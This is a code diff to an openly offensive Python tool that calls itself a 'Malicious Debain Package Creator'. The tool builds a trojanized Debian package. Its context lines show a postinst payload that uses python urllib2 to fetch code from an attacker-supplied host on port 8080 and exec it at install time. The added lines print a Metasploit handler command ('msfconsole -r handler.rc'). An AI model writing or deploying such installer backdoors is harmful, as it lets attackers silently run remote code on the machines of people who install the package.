@@ -61,6 +61,17 @@ import argparse,sys
 
 
 #
+# script colors
+#
+BOLD = '\033[1m'
+BLUE = '\033[94m'
+RED = '\033[91m'
+GREEN = '\033[32m'
+WHITE  = '\033[0m'  
+ORANGE  = '\033[33m'
+
+
+#
 # script banner
 #
 def printer():
@@ -74,7 +85,8 @@ def printer():
            \/            \./Suspicious Shell Activity     
            Malicious Debain Package Creator
            Coded by Chaitanya Haritash
-           Twitter :: @bofheaded         
+           Twitter :: @bofheaded
+
   """
 
 
@@ -105,11 +117,11 @@ def main():
 #!/bin/bash
 python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"  
 
-          """ 
+          """
+      k = r.write(payload)
       #
       # Build postinst file to trigger payload execution
       #
-      k = r.write(payload)
       o = open("postinst" , "a")
       m = """
 
@@ -189,12 +201,11 @@ exploit
     b = open("handler.rc" , "w")
     b.write(res)
     b.close()
-    time.sleep(2)
-
+    time.sleep(1)
+    print BOLD+"execute handler:"+WHITE+" sudo msfconsole -r handler.rc"
 
 #
 # No need to auto-execute handler (venom will take care of that)
-#    print "execute handler: sudo msfconsole -r handler.rc"
 #    os.system('xterm -e "sudo msfconsole -r handler.rc"')  
 #
 
